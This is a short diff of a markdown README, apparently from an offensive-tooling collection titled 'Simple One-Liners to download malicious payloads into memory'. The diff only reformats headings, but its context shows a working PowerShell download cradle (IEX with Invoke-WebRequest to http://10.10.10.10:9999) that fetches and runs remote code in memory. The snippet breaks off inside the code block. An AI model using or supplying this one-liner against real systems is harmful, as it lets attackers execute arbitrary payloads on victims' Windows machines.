@@ -2,9 +2,9 @@
 Simple One-Liners to download malicious payloads into memory & handy scripts 
 
 
-Windows One-Liners to Download Remote Payloads:
+# Windows One-Liners to Download Remote Payloads:
 
-Powershell:
+**Powershell:**
 ```
 powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"
 
